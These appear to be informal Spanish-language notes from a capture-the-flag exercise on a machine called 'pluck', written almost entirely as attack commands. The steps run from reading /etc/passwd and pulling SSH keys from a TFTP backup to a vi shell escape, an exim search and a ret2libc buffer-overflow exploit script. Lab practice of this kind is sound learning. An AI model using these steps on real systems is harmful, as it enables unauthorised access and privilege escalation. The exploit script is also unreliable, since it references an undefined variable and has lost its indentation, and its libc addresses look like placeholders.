pluck:1
zip y virtualbox

descubrimiento

podemos cargar /etc/passwd
ultima linea interesante

/usr/local/scripts/backup.sh

tftp
es un protocolo para transferir archivos
tftp 192.168.111.46
get backup.tar
exit

ls
tar -xf backup.tar
rm backup.tar
tree

vemos claves publicas y privadas de los usuarios
cd /paul/keys
ssh paul@192.168.111.46 -i id_key2
vamos probando todas las claves
aparece un menu
/etc/passwd

gtfobins
vi shell
vi 
:set shell=/bin/bash
escape :shell
export TERM=xterm
tengo una consola
id
lsb_release -a
cat /etc/os-release
uname -a
find / -perm -4000 2>/dev/null

exim
es un agente de transporte de correo utilizado en unix
searchsploit -m linux/ruta
lo comparto a la maquina victima

desarrollo incorrecto, buffer overflow
ubuntu.com/16.04/ de 32 bits no tiene entorno grafico
vamos a crear una maquina virtual
binario custom de savitar
apt update
apt install ssh gdb git
service start ssh

ssh savitar@ip
cd /usr/bin
wget binario/savitar

chmod +x custom

instalamos peda que es como gdb pero mejor esteticamente

custom Hola
custom AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
custom y muchisimas A
Segmentation fault

Hay programas que cortan la entrada del usuario pero no controlan que pasa si coloca mucho mas el usuario.

gdb
r AAAAAAAAAAAAAAAAAAAAAAA
r y muchisimas A
muestra error y direcciones de memoria y lo que esta dentro

EIP apunta a diferentes direcciones y hace que el programa corra bien
estamos reescribiendo registros que hacen algo, si ahora le colocamos un comando que tenga sentido y lo ejecuta **la colgamos**
Si hacemos que ese registro apunte a un payload malicioso **la petamos de verdad**

gdb /usr/bin/custom -q
tratar de averiguar en que momento, en que letra empieza a guardar en ese registro
pattern create 300
r 'cadena que genera el anterior'
EIP: APARECE ALGO
echo 'cadena enorme' | grep EIP
gbd 
pattern offset $eip
te devuelve en cuantos caracteres 
r $(python3 -c 'print("A")\*112 + "B"\*4)'
controlo lo que coloco en el eid

checksec
ver donde cargar los caracteres
NX: enable te impide la ejecucion

ret2libc -> system + exit + bin_sh
abusar del libc para aplicar una llamada a nivel de sistema
ver si 
ldd /usr/bin/custom 

nano exploit.py
#!/usr/bin/python3

import subprocess
import sys
from struct import pack

offset = 112
junk = b"A"\*112

\# ret2libc -> system + exit + bin_sh
base_libc_addr = 0x7584935728

system_addr_off = 0x43434343
exit_addr_off = 0x43234543
bin_sh_addr_off = 0x78658734

system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh = pack("<L", base_libc_addr + bin_sh_addr_off)

payload = junk + system_addr + exit_addr + bin_sh_addr

while True:
result = subprocess.run(["sudo", "/usr/bin/custom", payload])
if result.returncode == 0:
print("\n\n[+] Se ha salido correctamente del programa")
sys.exit(0)

python3 exploit.py

apt install binutils
readelf
ldd
readelf -s jklfjfkld;sa | grep -E " system| exit"
strings -a -t x jfkldsjakfdjsal | grep "/bin/sh"
chmod u-s /usr/bin/custom
nano /etc/sudoers
savitar ALL=(root) NOPASSWD: /usr/bin/custom
gpasswd -d savitar sudo





